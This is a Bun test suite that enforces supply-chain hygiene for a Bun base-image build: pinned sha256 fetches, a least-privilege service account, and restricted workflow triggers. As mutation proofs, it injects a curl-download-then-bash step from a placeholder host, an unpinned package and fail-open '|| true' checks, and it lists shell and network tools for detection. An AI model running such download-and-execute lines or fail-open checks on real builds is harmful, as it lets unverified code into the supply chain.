import { describe, expect, it } from 'bun:test';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { parse } from 'yaml';
import {
  render as renderUnpinned,
  entries as unpinnedEntries,
} from '../infra/bun-base/unpinned.mjs';

/**
 * #1452 — the patched-Bun build runs least-privilege and fetches nothing unverified that could be
 * pinned. Comment lines are stripped: they explain the design and may name the forbidden forms.
 */
const dir = resolve(import.meta.dirname, '..', 'infra/bun-base');
const code = (f: string) =>
  readFileSync(resolve(dir, f), 'utf8')
    .split('\n')
    .filter((l) => !l.trimStart().startsWith('#'))
    .join('\n');
const build = code('build.sh');
const cloudbuild = code('cloudbuild.yaml');

describe('cloudbuild.yaml runs as the dedicated build SA', () => {
  it('pins serviceAccount to bun-base-build, never the default compute SA', () => {
    expect(cloudbuild).toMatch(
      /^serviceAccount: projects\/gsw-mcp\/serviceAccounts\/bun-base-build@gsw-mcp\.iam\.gserviceaccount\.com$/m,
    );
    expect(cloudbuild).not.toMatch(/compute@developer/);
    expect(cloudbuild).toMatch(/logging: CLOUD_LOGGING_ONLY/);
  });

  it('SBOMs the built artifacts, not only the source tree', () => {
    expect(cloudbuild).toMatch(/scan, dir:\/workspace\/out\b/);
    expect(cloudbuild).toContain('bun-artifacts.cdx.json.sha256');
  });
});

describe('build.sh verifies every pinnable fetch', () => {
  it.each([
    ['apk --allow-untrusted', /--allow-untrusted/],
    ['a script piped into a shell', /\|\s*(ba)?sh\b/],
    ['a key dropped into trusted.gpg.d', /trusted\.gpg\.d/],
  ])('never uses %s', (_n, re) => {
    expect(build).not.toMatch(re);
  });

  const pins = readFileSync(resolve(dir, 'fetch-pins.sha256'), 'utf8').trim().split('\n');
  it.each([
    ['bootstrap bun zip', 'bun-linux-x64.zip'],
    ['rustup-init', 'rustup-init'],
    ['apk-tools-static', 'apk-tools-static.apk'],
  ])('checks the %s against its in-repo sha256 pin', (_n, file) => {
    expect(pins.filter((l) => l.endsWith(`  ${file}`))).toHaveLength(1);
    expect(pins).toContainEqual(
      expect.stringMatching(new RegExp(`^[0-9a-f]{64}  ${file.replace(/\./g, '\\.')}$`)),
    );
    expect(build).toMatch(
      new RegExp(`(^|\\(cd /tmp && )pin ${file.replace(/\./g, '\\.')}\\)?$`, 'm'),
    );
  });

  it('the pin helper demands exactly one sha256sum line and runs sha256sum -c', () => {
    expect(build).toContain('grep -c .)" = 1 ] ||');
    expect(build).toContain('printf \'%s\\n\' "$line" | sha256sum -c -');
  });

  it('pins the apt.llvm.org key fingerprint and the LLVM package version', () => {
    expect(build).toMatch(/^LLVM_SIGNER_FPR='(?:[0-9A-F]{4} {1,2}){9}[0-9A-F]{4}'$/m);
    expect(build).toContain('[ "$fpr" = "${LLVM_SIGNER_FPR// /}" ] ||');
    expect(build).toContain('signed-by=/etc/apt/keyrings/apt.llvm.org.gpg');
    for (const pkg of ['clang', 'lld', 'llvm', 'libclang-rt', 'libclang-common']) {
      expect(build).toMatch(new RegExp(`${pkg}-\\$LLVM_MAJOR(-dev)?="\\$LLVM_PKG_VERSION"`));
    }
  });

  it('secret-scan hygiene: no NAME=<32+ hex> assignment in build.sh', () => {
    expect(build).not.toMatch(/^\s*(export\s+)?[A-Za-z_][A-Za-z0-9_]*=['"]?[0-9A-Fa-f]{32,}/m);
  });

  it('verifies Alpine packages against the checked-in keys', () => {
    expect(build).toContain('--keys-dir "$WS/keys/$apkarch"');
    expect(build).toContain('sha256sum -c --strict SHA256SUMS');
    const sums = readFileSync(resolve(dir, 'keys/SHA256SUMS'), 'utf8').trim().split('\n');
    for (const arch of ['x86_64', 'aarch64']) {
      expect(sums.some((l) => new RegExp(`^[0-9a-f]{64}  ${arch}/\\S+\\.rsa\\.pub$`).test(l))).toBe(
        true,
      );
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────
// SCANNING guard (round 3). The rows above assert known lines; an enumeration is how the next fetch
// gets missed. This scans build.sh: every network-fetching command must be followed, in its own
// region, by the verifier that pins it, OR match an entry of unpinned-fetches.json (the list the
// README renders); anything else is a violation. Fail-open constructs are red wherever they sit.
// ─────────────────────────────────────────────────────────────────────────────────────────────

/** Logical lines: comment lines dropped, `\` continuations joined. */
export function logicalLines(script: string): string[] {
  const logical: string[] = [];
  let acc = '';
  for (const raw of script.split('\n')) {
    if (raw.trimStart().startsWith('#')) continue;
    if (raw.endsWith('\\')) {
      acc += `${raw.slice(0, -1)} `;
      continue;
    }
    logical.push((acc + raw).trim());
    acc = '';
  }
  return logical;
}

/** Command segments, each remembering its logical line. */
export function segments(script: string): { seg: string; line: number }[] {
  return logicalLines(script).flatMap((l, line) =>
    l
      .split(/&&|\|\||;|\||\$\(|\(|\)/)
      .map((x) => x.trim())
      .filter(Boolean)
      .map((seg) => ({ seg, line })),
  );
}

const FETCH_CMDS = new Set([
  'curl',
  'wget',
  'apt-get',
  'apt',
  'apk',
  'apk.static',
  'rustup',
  'rustup-init',
  'cargo',
  'npm',
  'npx',
  'pnpm',
  'yarn',
  'pip',
  'pip3',
  'gh',
  'gsutil',
  'gcloud',
  'docker',
  'nc',
  'ssh',
  'scp',
  'rsync',
]);
const SHELLS = new Set([
  'bash',
  'sh',
  'zsh',
  'dash',
  'source',
  '.',
  'eval',
  'python',
  'python3',
  'perl',
  'ruby',
  'node',
]);

function head(seg: string): { cmd: string; rest: string } {
  const toks = seg.replace(/^!\s*/, '').split(/\s+/);
  let i = 0;
  while (i < toks.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(toks[i]!)) i++; // env assignments
  const cmd =
    (toks[i] ?? '')
      .replace(/^["']|["']$/g, '')
      .split('/')
      .pop() ?? '';
  return { cmd, rest: toks.slice(i + 1).join(' ') };
}

function isFetch(seg: string): boolean {
  const { cmd, rest } = head(seg);
  if (FETCH_CMDS.has(cmd)) return true;
  if (cmd === 'git') return /^(fetch|clone|pull|submodule|lfs|remote update)\b/.test(rest);
  if (cmd === 'bun') return /^(install|add|x|create|i)\b/.test(rest);
  if (cmd === 'go') return /^(get|install)\b/.test(rest);
  return false;
}

const APT_ALLOWED = new Set(
  'curl wget ca-certificates lsb-release gnupg cmake git golang libtool ninja-build pkg-config ruby-full xz-utils nasm unzip python3 build-essential libicu-dev perl zstd file'.split(
    ' ',
  ),
);
const APT_LLVM =
  /^(clang|lld|llvm|libclang-rt|libclang-common)-\$LLVM_MAJOR(-dev)?="\$LLVM_PKG_VERSION"$/;

/** Region verifiers: a fetch matching `fetch` must have every `verify` regex in its region. */
const PINNED: { name: string; fetch: RegExp; verify: RegExp[]; shape?: RegExp }[] = [
  {
    name: 'llvm key',
    fetch: /^wget\b.*apt\.llvm\.org/,
    verify: [/\[ "\$fpr" = "\$\{LLVM_SIGNER_FPR\/\/ \/\}" \]/],
  },
  {
    name: 'bootstrap bun zip',
    fetch: /^curl\b.*bun-linux-x64\.zip/,
    verify: [/(^|\s)pin bun-linux-x64\.zip\)?$/m],
  },
  {
    name: 'bun SHASUMS',
    fetch: /^curl\b.*SHASUMS256\.txt/,
    verify: [
      /^grep -qxF "\$\(grep -E ' {2}bun-linux-x64\\\.zip\$' "\$WS\/fetch-pins\.sha256"\)" SHASUMS256\.txt$/m,
    ],
  },
  { name: 'rustup-init', fetch: /^curl\b.*rustup-init/, verify: [/(^|\s)pin rustup-init\)?$/m] },
  {
    name: 'apk-tools-static',
    fetch: /^curl\b.*apk-tools-static/,
    verify: [/(^|\s)pin apk-tools-static\.apk\)?$/m],
  },
  { name: 'webkit prebuilt', fetch: /^curl\b.*"\$wkurl"/, verify: [/(^|\s)pin "\$wkfile"\)?$/m] },
  {
    name: 'bun source at the SHA',
    fetch: /^git fetch\b/,
    shape: /^git fetch -q --depth 1 origin "\$UPSTREAM_SHA"$/,
    verify: [/^test "\$\(git rev-parse HEAD\)" = "\$UPSTREAM_SHA"$/m],
  },
];

export function scanBuildScript(
  script: string,
  unpinned: { id: string; match: string | null }[],
): string[] {
  const v: string[] = [];
  const lines = logicalLines(script);
  const code = lines.join('\n');
  const segs = segments(script);
  const matched = new Set<string>();

  if (!/^set -euo pipefail$/m.test(code)) v.push('set -euo pipefail missing');

  // Fail-open: every `||` must lead to an exit; nothing may neutralise a check.
  for (const l of lines) {
    for (const m of l.matchAll(/\|\|\s*(.*)$/g)) {
      if (!/^(\{.*\bexit [1-9]\b.*\}|exit [1-9])/.test(m[1]!))
        v.push(`|| that does not exit: ${m[0].slice(0, 60)}`);
    }
  }
  if (/(\btrue|(^|\s):)\s*(\|\||&&)/m.test(code))
    v.push('true/: chained before || or && (neutralised check)');
  if (/;\s*:(\s|$)/m.test(code) || /set \+e/.test(code)) v.push('`;:` or set +e');
  if (/--allow-untrusted|trusted\.gpg\.d/.test(code)) v.push('trust bypass');

  segs.forEach(({ seg, line }, i) => {
    const { cmd, rest } = head(seg);
    if (SHELLS.has(cmd) && !/^"\$WS\/prefix\.sh"$/.test(rest))
      v.push(`interpreter/shell run: ${seg.slice(0, 60)}`);
    if (!isFetch(seg)) return;

    if (cmd === 'apt-get' && /\binstall\b/.test(seg)) {
      const pk = rest
        .replace(/^.*?\binstall\b/, '')
        .split(/\s+/)
        .filter((t) => t && !t.startsWith('-') && !t.startsWith('>'));
      for (const t of pk)
        if (!APT_ALLOWED.has(t) && !APT_LLVM.test(t))
          v.push(`apt package outside the pinned set: ${t}`);
    }

    const u = unpinned.find((e) => e.match && new RegExp(e.match).test(seg));
    if (u) {
      matched.add(u.id);
      return;
    }
    const rule = PINNED.find((r) => r.fetch.test(seg));
    if (!rule) {
      v.push(`unclassified fetch (neither pinned nor listed unpinned): ${seg.slice(0, 80)}`);
      return;
    }
    if (rule.shape && !rule.shape.test(seg))
      v.push(`${rule.name}: fetch has the wrong shape: ${seg.slice(0, 80)}`);
    // Region: this fetch's logical line up to (not including) the line of the next fetch.
    let j = i + 1;
    while (j < segs.length && (!isFetch(segs[j]!.seg) || segs[j]!.line === line)) j++;
    const endLine = j < segs.length ? segs[j]!.line : lines.length;
    const region = lines.slice(line, endLine).join('\n');
    for (const re of rule.verify)
      if (!re.test(region)) v.push(`${rule.name}: verifier ${re} not found after the fetch`);
  });

  for (const e of unpinned)
    if (e.match && !matched.has(e.id)) v.push(`stale unpinned entry (matches nothing): ${e.id}`);
  return v;
}

describe('build.sh scan: every fetch is pinned or explicitly listed unpinned', () => {
  const unpinned = unpinnedEntries() as { id: string; match: string | null; why: string }[];
  const real = readFileSync(resolve(dir, 'build.sh'), 'utf8');
  const scan = (t: string) => scanBuildScript(t, unpinned);

  it('the real script has no violations', () => {
    expect(scan(real)).toEqual([]);
  });

  it('every fetch is seen: the scan finds the fetches this test knows exist', () => {
    const n = segments(real).filter((x) => isFetch(x.seg)).length;
    expect(n).toBeGreaterThanOrEqual(12);
  });

  it('README block is generated from unpinned-fetches.json (no drift)', () => {
    expect(readFileSync(resolve(dir, 'README.md'), 'utf8')).toContain(renderUnpinned());
  });

  it('every unpinned entry has a reason', () => {
    for (const e of unpinned) expect(e.why.length).toBeGreaterThan(20);
  });

  const sub = (from: string, to: string) => {
    expect(real.split(from).length, `anchor occurs exactly once: ${from}`).toBe(2);
    return real.replace(from, to);
  };
  // In-suite mutation proofs: each is a fetch/verify weakening the old enumerating guard let through.
  it.each([
    [
      'download-to-file then bash file',
      () =>
        sub('lap sysroots', 'curl -fsSLo /tmp/x https://e.invalid/x\nbash /tmp/x\nlap sysroots'),
    ],
    ['apt-get install of an unpinned package', () => sub('unzip python3', 'unzip evilpkg python3')],
    [
      'rev-parse == UPSTREAM_SHA check removed',
      () => sub('test "$(git rev-parse HEAD)" = "$UPSTREAM_SHA"\n', ''),
    ],
    [
      'git fetch origin main instead of the SHA',
      () => sub('origin "$UPSTREAM_SHA"', 'origin main'),
    ],
    [
      'SHASUMS cross-check turned into true ||',
      () => sub('grep -qxF "$(grep -E', 'true || grep -qxF "$(grep -E'),
    ],
    [
      'sha256sum -c - || true (fail-open pin)',
      () => sub('sha256sum -c -\n}', 'sha256sum -c - || true\n}'),
    ],
    ['a pin removed from a curl', () => sub('(cd /tmp && pin rustup-init)', 'true')],
    [
      'an unlisted curl added',
      () => sub('lap sysroots', 'curl -fsSLO https://e.invalid/y\nlap sysroots'),
    ],
    [
      'pin() check swallowed with ||:',
      () => sub('pin bun-linux-x64.zip\n', 'pin bun-linux-x64.zip || :\n'),
    ],
    ['webkit pin removed', () => sub('(cd /tmp/wk && pin "$wkfile")', 'true')],
  ])('goes RED on: %s', (_n, mutate) => {
    expect(scan(mutate()).length).toBeGreaterThan(0);
  });

  it('positive control: a correctly pinned extra fetch stays green', () => {
    const add = `${'curl -fsSLo /tmp/bun-linux-x64.zip https://e.invalid/z'}\npin bun-linux-x64.zip\n`;
    // same shape as the existing bootstrap fetch, which the rule table already pins
    expect(scan(sub('lap sysroots', `${add}lap sysroots`))).toEqual([]);
  });
});

describe('bun-base-build.yml: credentialed job triggers and permissions', () => {
  const wfText = readFileSync(
    resolve(dir, '..', '..', '.github/workflows/bun-base-build.yml'),
    'utf8',
  );
  const problems = (t: string): string[] => {
    const doc = parse(t) as {
      on?: unknown;
      permissions?: unknown;
      jobs?: Record<string, { permissions?: unknown }>;
    };
    const out: string[] = [];
    const on = doc.on;
    const triggers = typeof on === 'string' ? [on] : Object.keys((on ?? {}) as object);
    for (const tr of triggers)
      if (!['workflow_dispatch', 'schedule'].includes(tr)) out.push(`trigger ${tr}`);
    if (
      /pull_request_target/.test(
        t
          .split('\n')
          .filter((l) => !l.trimStart().startsWith('#'))
          .join('\n'),
      )
    )
      out.push('pull_request_target');
    const perms = [doc.permissions, ...Object.values(doc.jobs ?? {}).map((j) => j.permissions)];
    for (const p of perms) {
      if (p === undefined) continue;
      for (const [k, val] of Object.entries((p ?? {}) as Record<string, string>)) {
        const ok = (k === 'contents' && val === 'read') || (k === 'id-token' && val === 'write');
        if (!ok) out.push(`permission ${k}: ${val}`);
      }
    }
    return out;
  };

  it('has only workflow_dispatch/schedule triggers and only contents:read + id-token:write', () => {
    expect(problems(wfText)).toEqual([]);
  });

  it.each([
    [
      'a pull_request_target trigger',
      (t: string) => t.replace('on:\n', 'on:\n  pull_request_target:\n'),
    ],
    ['a pull_request trigger', (t: string) => t.replace('on:\n', 'on:\n  pull_request:\n')],
    ['contents: write', (t: string) => t.replace('contents: read', 'contents: write')],
    [
      'packages: write',
      (t: string) => t.replace('contents: read', 'contents: read\n      packages: write'),
    ],
  ])('goes RED on: %s', (_n, mutate) => {
    expect(mutate(wfText)).not.toBe(wfText);
    expect(problems(mutate(wfText)).length).toBeGreaterThan(0);
  });
});
